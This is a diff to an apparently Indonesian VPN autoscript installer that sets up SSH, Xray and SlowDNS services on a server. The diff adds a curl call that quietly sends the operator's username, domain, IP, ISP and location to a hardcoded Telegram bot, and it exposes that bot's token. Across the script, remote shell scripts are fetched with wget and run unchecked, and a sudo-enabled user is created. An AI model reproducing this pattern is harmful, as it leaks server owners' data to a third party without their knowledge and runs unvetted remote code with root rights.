@@ -87,7 +87,7 @@ secs_to_human() {
 echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minute's $(( ${1} % 60 )) seconds"
 }
 start=$(date +%s)
-ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
+ln -fs /usr/share/zoneinfo/Asia/Makassar /etc/localtime
 sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
 sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1
 coreselect=''
@@ -104,28 +104,50 @@ chmod 644 /root/.profile
 echo -e "[ ${green}INFO${NC} ] Preparing the install file"
 apt install git curl -y >/dev/null 2>&1
 apt install python -y >/dev/null 2>&1
-echo -e "[ ${green}INFO${NC} ] Pemasangan File Sudah Siapp Sayang"
+echo -e "[ ${green}INFO${NC} ] Aight good ... installation file is ready"
+echo -e "$green                                                                                         $NC"
+echo -e "$green██████╗░██████╗░██╗███╗░░██╗░██████╗░░█████╗░░██████╗  ░█████╗░██╗░░░██╗████████╗░█████╗░$NC"
+echo -e "$green██╔══██╗██╔══██╗██║████╗░██║██╔════╝░██╔══██╗██╔════╝  ██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗$NC"
+echo -e "$green██████╦╝██████╔╝██║██╔██╗██║██║░░██╗░███████║╚█████╗░  ███████║██║░░░██║░░░██║░░░██║░░██║$NC"
+echo -e "$green██╔══██╗██╔══██╗██║██║╚████║██║░░╚██╗██╔══██║░╚═══██╗  ██╔══██║██║░░░██║░░░██║░░░██║░░██║$NC"
+echo -e "$green██████╦╝██║░░██║██║██║░╚███║╚██████╔╝██║░░██║██████╔╝  ██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝$NC"
+echo -e "$green╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░$NC"
+echo -e "$green                                                                                         $NC"
+echo -e "$green██╗███╗░░██╗░██████╗████████╗░█████╗░██╗░░░░░██╗░░░░░  ░██████╗░██████╗██╗░░██╗$NC"
+echo -e "$green██║████╗░██║██╔════╝╚══██╔══╝██╔══██╗██║░░░░░██║░░░░░  ██╔════╝██╔════╝██║░░██║$NC"
+echo -e "$green██║██╔██╗██║╚█████╗░░░░██║░░░███████║██║░░░░░██║░░░░░  ╚█████╗░╚█████╗░███████║$NC"
+echo -e "$green██║██║╚████║░╚═══██╗░░░██║░░░██╔══██║██║░░░░░██║░░░░░  ░╚═══██╗░╚═══██╗██╔══██║$NC"
+echo -e "$green██║██║░╚███║██████╔╝░░░██║░░░██║░░██║███████╗███████╗  ██████╔╝██████╔╝██║░░██║$NC"
+echo -e "$green╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝  ╚═════╝░╚═════╝░╚═╝░░╚═╝$NC"
+echo -e "$green» TERIMAKASIH TELAH MEMAKAI AUTOSCRIPT PREMIUM RISWAN-VPN$NC"
 sleep 5
 echo -ne "[ ${green}INFO${NC} ] Check permission : "
 mkdir -p /var/lib/SIJA >/dev/null 2>&1
-echo "IP=" >> /var/lib/ipvps.conf
+echo "IP=" >> /var/lib/SIJA/ipvps.conf
 echo ""
 wget -q https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/tools.sh;chmod +x tools.sh;./tools.sh
 rm tools.sh
 clear
 echo " "
 clear
-    echo -e "$BYellow◇━━━━━━━━━━━━━━━━━━◇$NC"
+echo -e "$green━━━━━━━━━━┏┓━━━━━━━━━━━━━━━━━━━━━━━━┏┓━━━━━━━━━━━$NC"
+echo -e "$green━━━━━━━━━┏┛┗┓━━━━━━━━━━━━━━━━━━━━━━┏┛┗┓━━━━━━━━━━$NC"
+echo -e "$green┏━━┓━┏┓┏┓┗┓┏┛┏━━┓━━━━┏━━┓┏━━┓┏┓┏━┓━┗┓┏┛┏┓┏━┓━┏━━┓$NC"
+echo -e "$green┗━┓┃━┃┃┃┃━┃┃━┃┏┓┃━━━━┃┏┓┃┃┏┓┃┣┫┃┏┓┓━┃┃━┣┫┃┏┓┓┃┏┓┃$NC"
+echo -e "$green┃┗┛┗┓┃┗┛┃━┃┗┓┃┗┛┃━━━━┃┗┛┃┃┗┛┃┃┃┃┃┃┃━┃┗┓┃┃┃┃┃┃┃┗┛┃$NC"
+echo -e "$green┗━━━┛┗━━┛━┗━┛┗━━┛━━━━┃┏━┛┗━━┛┗┛┗┛┗┛━┗━┛┗┛┗┛┗┛┗━┓┃$NC"
+echo -e "$green━━━━━━━━━━━━━━━━━━━━━┃┃━━━━━━━━━━━━━━━━━━━━━━┏━┛┃$NC"
+echo -e "$green━━━━━━━━━━━━━━━━━━━━━┗┛━━━━━━━━━━━━━━━━━━━━━━┗━━┛$NC"
     echo -e "$BBlue                     SETUP DOMAIN VPS     $NC"
-    echo -e "$BYellow◇━━━━━━━━━━━━━━━━━━◇$NC"
+    echo -e "$BYellow----------------------------------------------------------$NC"
     echo -e "$BGreen 1. Choose Your Own Domain / Gunakan Domain Sendiri $NC"
     echo -e "$BGreen 2. Use Domain Random / Gunakan Domain Random $NC"
-    echo -e "$BYellow◇━━━━━━━━━━━━━━━━━━◇$NC"
+    echo -e "$BYellow----------------------------------------------------------$NC"
     read -rp " input 1 or 2 / pilih 1 atau 2 : " dns
 	if test $dns -eq 1; then
     read -rp " Enter Your Domain / masukan domain : " dom
     read -rp " Input ur ns-domain : " -e nsdomen
-    echo "IP=$dom" > /var/lib/ipvps.conf
+    echo "IP=$dom" > /var/lib/SIJA/ipvps.conf
     echo "$dom" > /root/scdomain
 	echo "$dom" > /etc/xray/scdomain
 	echo "$dom" > /etc/xray/domain
@@ -166,33 +188,53 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
+CHATID="5521096873"
+KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="Instalasi Autoscript-vvip V2.5
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<code>Username   :</code> <code>$Name</code>
+<code>Domain     :</code> <code>$domain</code>
+<code>IP Vps     :</code> <code>$MYIP</code>
+<code>IP Vps     :</code> <code>$ISP</code>
+<code>Timezone   :</code> <code>$TIMEZONE</code>
+<code>Location   :</code> <code>$CITY</code>
+<code>Exp Sc.    :</code> <code>$Exp</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+By Admin @Riswanvpnstore
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<i>Notifications Automatic From Github</i>
+"'&reply_markup={"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/Riswanvpnstore"},{"text":"Contack","url":"https://wa.me/6285888801241"}]]}'
+
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
-echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
-echo -e "$green      Menginstall SSH / WS               $NC"
-echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "$green      Install SSH / WS               $NC"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
 wget https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
 clear
-echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
-echo -e "$green      Menginstall BACKUP               $NC"
-echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "$green      Install BACKUP               $NC"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
 wget https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
 clear
 clear
-echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
-echo -e "$green      Menginstall XRAY              $NC"
-echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "$green          Install XRAY              $NC"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
 wget https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
 wget https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
 clear
-echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
-echo -e "$green      Menginstall SLOWDNS              $NC"
-echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "$green          Install SLOWDNS              $NC"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 sleep 2
 clear
 wget -q -O slow.sh https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/slow.sh && chmod +x slow.sh && ./slow.sh
@@ -230,8 +272,7 @@ gg="AM"
 fi
 curl -sS ifconfig.me > /etc/myipvps
 echo " "
-echo "◇━━━━━━━━━━━━━━━━━━━━◇" | tee -a log-install.txt
-echo "◇━━━━━━━━━━━━━━━━━━◇" | tee -a log-install.txt
+echo "------------------------------------------------------------" | tee -a log-install.txt
 echo "" | tee -a log-install.txt
 echo "   >>> Service & Port"  | tee -a log-install.txt
 echo "   - OpenVPN              : 2086"  | tee -a log-install.txt
@@ -251,7 +292,7 @@ echo "   - Trojan WS            : 443" | tee -a log-install.txt
 echo "   - Trojan Go            : 443" | tee -a log-install.txt
 echo ""  | tee -a log-install.txt
 echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
-echo "   - Timezone             : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
+echo "   - Timezone             : Asia/Makassar (GMT +8)"  | tee -a log-install.txt
 echo "   - Fail2Ban             : [ON]"  | tee -a log-install.txt
 echo "   - Dflate               : [ON]"  | tee -a log-install.txt
 echo "   - IPtables             : [ON]"  | tee -a log-install.txt
@@ -266,8 +307,7 @@ echo "   - Admin Control" | tee -a log-install.txt
 echo "   - Change port" | tee -a log-install.txt
 echo "   - Full Orders For Various Services" | tee -a log-install.txt
 echo "" | tee -a log-install.txt
-echo "◇━━━━━━━━━━━━━━━━━━◇" | tee -a log-install.txt
-echo "◇━━━━━━━━━━━━━━━━━━━━◇" | tee -a log-install.txt
+echo "------------------------------------------------------------" | tee -a log-install.txt
 echo ""
 echo ""
 rm /root/setup.sh >/dev/null 2>&1
